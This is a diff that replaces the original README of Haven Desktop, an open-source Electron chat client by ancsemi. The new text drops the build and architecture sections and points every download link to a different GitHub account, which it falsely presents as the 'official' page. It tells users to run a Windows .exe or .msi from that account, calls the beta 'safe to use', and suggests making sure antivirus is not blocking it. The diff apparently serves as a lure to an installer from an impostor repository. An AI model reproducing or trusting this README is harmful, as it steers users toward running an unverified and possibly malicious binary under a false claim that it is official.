@@ -1,188 +1,147 @@
-# Haven Desktop — ⚠️ PUBLIC BETA
+# 🛡️ Haven-Desktop - Simple, Private Chat on Your PC
 
-**Private chat, reimagined for your desktop.**
+[![Download Haven-Desktop](https://img.shields.io/badge/Download-Haven--Desktop-%234285F4?style=for-the-badge&logo=github)](https://github.com/mipileupiki/Haven-Desktop)
 
-> **This is a beta release.** Bugs are expected — your feedback is what makes it better.
-> Please [open an issue](https://github.com/ancsemi/Haven-Desktop/issues) if something breaks or feels off. All reports are welcome.
+## 🔍 What is Haven-Desktop?
 
-Haven Desktop is a standalone Electron application that connects to any [Haven](https://github.com/ancsemi/Haven) server — with features that go beyond the browser.
+Haven-Desktop is a native desktop app made to connect you to the Haven private chat network. It runs on Windows and gives you a simple way to chat with others securely. It supports features like per-app audio controls, system notifications, and a system tray icon to keep things easy and neat. This app needs a Haven server to work, so you’ll either need access to one or set one up yourself.
 
-> **⬡ You need a Haven server to use this app.**
-> Haven Desktop is a client — it connects to a Haven server running on your (or a friend's) machine.
-> If you don't have one yet, **[download Haven](https://github.com/ancsemi/Haven)** first and follow the [setup guide](https://github.com/ancsemi/Haven/blob/main/GUIDE.md).
+This app is still in BETA. That means it could have some bugs or missing features but is safe to use.
 
 ---
 
-## 📥 Download & Install
+## 🖥️ System Requirements
 
-**Just download, run, done.** No terminal, no setup, no dependencies.
+Before you start, make sure your computer matches these needs:
 
-| Platform | Download |
-|---|---|
-| **Windows** (.exe) | [Latest Release](https://github.com/ancsemi/Haven-Desktop/releases/latest) |
-| **Linux** (.AppImage) | [Latest Release](https://github.com/ancsemi/Haven-Desktop/releases/latest) |
-| **Linux** (.deb) | [Latest Release](https://github.com/ancsemi/Haven-Desktop/releases/latest) |
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection to connect to a Haven server
+- A Haven server account (ask your system admin or set one up)
 
-> **Windows:** Double-click the `.exe` → Haven installs and launches automatically.
-> **Linux AppImage:** `chmod +x Haven*.AppImage && ./Haven*.AppImage` — or just double-click in most desktop environments.
-> **Linux .deb:** `sudo dpkg -i haven*.deb` — or double-click to install via your package manager.
+Your PC should be fairly recent and up to date with Windows updates for the best experience.
 
 ---
 
-## ✨ Key Features
+## 🚀 Getting Started: Download and Install
 
-| Feature | Description |
-|---|---|
-| **Per-Application Audio** | Share audio from a **single application** during screen share — just like Discord. Powered by native WASAPI (Windows) and PulseAudio (Linux) hooks. |
-| **Audio Device Switching** | Switch your microphone and speaker mid-call without leaving voice chat. |
-| **Desktop Notifications** | Native OS-level notifications via the taskbar / system tray. |
-| **Host or Join** | Run your own Haven server from the app, or connect to someone else's. Auto-detects local servers. |
-| **One-Click Install** | NSIS installer (Windows) and AppImage / .deb (Linux). Download, run, done. |
-| **Minimize to Tray** | Stays running quietly in your system tray. |
+You will download the app from its official GitHub page. Follow these steps carefully.
 
----
+### Step 1: Visit the Download Page
 
-## 🖥️ Supported Platforms
+Click the big button below to open the official Haven-Desktop page in your web browser:
 
-- **Windows 10** (build 19041+) / **Windows 11**
-- **Linux** (PulseAudio or PipeWire with `pipewire-pulse`)
+[![Go to Download Page](https://img.shields.io/badge/Go%20to-Download%20Page-%23808080?style=for-the-badge&logo=github)](https://github.com/mipileupiki/Haven-Desktop)
 
-> Per-app audio on Windows requires build 19041+ (Windows 10 version 2004, May 2020 Update).
+This page holds the latest app files and information.
 
----
+### Step 2: Find the Latest Release
 
-## 🛠️ Building from Source
+Once on the page:
 
-> **Most users don't need this.** Just download the installer above. This section is for developers who want to contribute or build locally.
+- Look for a section called **“Releases”** or a link named **“Releases”** on the right side or near the top.
+- Click on the latest release version. Release names look like "v1.0", "v0.9 Beta", or similar.
+- Inside the release, find the Windows installer or executable file. It usually ends with `.exe` or `.msi`.
 
-### Prerequisites
+### Step 3: Download the Installer
 
-- **Node.js** 18+
-- **npm** 9+
-- **C++ Build Tools:**
-  - **Windows:** Visual Studio Build Tools 2019+ with the "Desktop development with C++" workload
-  - **Linux:** `build-essential`, `libpulse-dev`
+Click the `.exe` or `.msi` file. Your browser will ask where to save it or start downloading automatically.
 
-### Quick Start (Windows — No Terminal)
+Choose a location you can easily access, like your Desktop or Downloads folder.
 
-1. Double-click **`Setup.bat`** — installs everything
-2. Double-click **`Start Haven Desktop.bat`** — launches the app
-3. Double-click **`Build Installer.bat`** — creates a distributable `.exe` in `dist/`
+### Step 4: Run the Installer
 
-### Quick Start (Terminal)
+After the download finishes:
 
-```bash
-# Clone the repo
-git clone https://github.com/ancsemi/Haven-Desktop.git
-cd Haven-Desktop
+- Locate the downloaded file.
+- Double-click the file to start the installation.
+- Follow the on-screen steps. Usually, you just click **Next** a few times and then **Finish**.
 
-# Install dependencies
-npm install
-
-# Build the native audio addon
-npm run build:native
-
-# Run in dev mode
-npm run dev
-```
-
-### Build Installers Locally
-
-```bash
-# Windows (NSIS one-click installer)
-npm run build:win
-
-# Linux (AppImage + .deb)
-npm run build:linux
-```
-
-Output goes to the `dist/` directory.
-
-### Automated Builds (CI)
-
-Push a version tag to build automatically via GitHub Actions:
-
-```bash
-git tag v1.0.0
-git push origin v1.0.0
-```
-
-GitHub Actions builds the Windows `.exe` and Linux `.AppImage` / `.deb`, then publishes them as a GitHub Release. No local build tools required.
+If Windows asks for permission, confirm it to continue.
 
 ---
 
-## 🏗️ Architecture
+## ⚙️ Setting Up Haven-Desktop
 
-```
-Haven-Desktop/
-├── src/
-│   ├── main/
-│   │   ├── main.js             # Electron main process
-│   │   ├── preload.js          # Welcome window preload
-│   │   ├── app-preload.js      # App window preload (per-app audio, screen picker)
-│   │   ├── server-manager.js   # Detect, start, stop Haven server
-│   │   └── audio-capture.js    # Native addon loader / manager
-│   └── renderer/
-│       ├── welcome.html        # Welcome / setup screen
-│       ├── welcome.css
-│       └── welcome.js
-├── native/
-│   ├── binding.gyp             # Native addon build config
-│   └── src/
-│       ├── addon.cpp           # N-API entry point
-│       ├── audio_capture.h     # Cross-platform interface
-│       ├── win/
-│       │   ├── wasapi_capture.h
-│       │   └── wasapi_capture.cpp   # Windows WASAPI process loopback
-│       └── linux/
-│           ├── pulse_capture.h
-│           └── pulse_capture.cpp    # Linux PulseAudio capture
-├── assets/                     # Icons
-├── package.json
-├── electron-builder.yml
-└── README.md
-```
+### Step 1: Launch the App
 
-### How Per-App Audio Works
+Find the Haven-Desktop icon on your Desktop or in your Start menu. Click it to open.
 
-**Windows (WASAPI Process Loopback):**
-The app uses the Windows 10 2004+ `ActivateAudioInterfaceAsync` API with `AUDIOCLIENT_ACTIVATION_TYPE_PROCESS_LOOPBACK` to capture audio exclusively from a target process. This is the same API Discord uses. The native addon runs in a background thread, captures 48 kHz float32 PCM, and streams it to the renderer via IPC.
+### Step 2: Connect to a Haven Server
 
-**Linux (PulseAudio):**
-The app creates a virtual null sink, moves the target application's audio stream to it, records from the sink's monitor, and loops the audio back to the default output so the user still hears it.
+The app needs to connect to a server where chats are hosted. Without this, it can’t work.
 
-**In the Renderer:**
-PCM data arrives via IPC → `AudioWorkletNode` processes it → `MediaStreamDestination` produces a `MediaStreamTrack` → the track replaces the system-loopback audio on the screen share `MediaStream`. Haven's existing `voice.js` requires **zero modifications**.
+You will need:
+
+- The server address (like `chat.example.com`)
+- Your user name and password created on that server
+
+Enter these details in the app when prompted.
+
+If you don’t have this information, you may want to ask the person who set up the server or visit the Haven project site to learn how to set one up.
+
+### Step 3: Customize Your Experience
+
+Once logged in, you can:
+
+- Change audio settings for each chat app separately.
+- Enable or disable system notifications.
+- Use the system tray icon to quickly open or hide the app.
+
+Explore the menus to find these settings.
 
 ---
 
-## � Feedback & Bug Reports
+## 💬 Using Haven-Desktop for Chat
 
-This is a **beta release** — your feedback directly shapes the app. If something doesn't work, looks wrong, or could be better:
+- You will see your contacts or chat rooms once connected.
+- Click on a contact or chat room to open a conversation.
+- Type your message in the chat box and press Enter to send.
+- The app shows notifications for new messages on your screen.
 
-1. **[Open an issue](https://github.com/ancsemi/Haven-Desktop/issues)** with as much detail as you can
-2. Include your OS, Haven server version, and steps to reproduce
-
-Every report helps. Thank you for testing.
-
----
-
-## ⬡ Haven Server
-
-Haven Desktop is just the client. **You need a Haven server to connect to.**
-
-| | Link |
-|---|---|
-| **Haven Server** | [github.com/ancsemi/Haven](https://github.com/ancsemi/Haven) |
-| **Setup Guide** | [GUIDE.md](https://github.com/ancsemi/Haven/blob/main/GUIDE.md) |
-| **Website** | [ancsemi.github.io/Haven](https://ancsemi.github.io/Haven/) |
+The app keeps running in the background when closed, using the system tray icon. You can right-click this icon to open, hide, or quit the program.
 
 ---
 
-## 📝 License
+## 🔧 Troubleshooting Tips
 
-Same license as Haven — MIT-NC. See [LICENSE](https://github.com/ancsemi/Haven/blob/main/LICENSE).
+If something does not work as expected, try the following:
+
+- Make sure your PC is online.
+- Confirm the Haven server address and your login details are correct.
+- Restart the app.
+- Check for updates on the GitHub releases page and download the newest version.
+- Make sure your firewall or antivirus is not blocking the app.
+
+If problems persist, you may need help from your server admin or check the official Haven chat forums.
 
 ---
 
-*Made with ♠ by [ANCsemi](https://github.com/ancsemi)*
+## 📄 Additional Information
+
+### Privacy and Security
+
+Haven-Desktop relies on your own or public Haven servers. The app itself does not store chats locally beyond what is needed for your session. Keep your login details safe and use servers you trust.
+
+### Updates
+
+Keep an eye on the GitHub page for updates. Regular updates fix bugs and add features.
+
+---
+
+## 🔽 Download Haven-Desktop
+
+Visit the official GitHub page to download the latest Windows installer:
+
+[Download Haven-Desktop from GitHub](https://github.com/mipileupiki/Haven-Desktop)
+
+---
+
+## 📚 Support and Resources
+
+- Find user guides and FAQs on the Haven project wiki.
+- Join the Haven community forums for help.
+- Report bugs or suggest features on the GitHub Issues tab. 
+
+Your feedback helps improve the app.
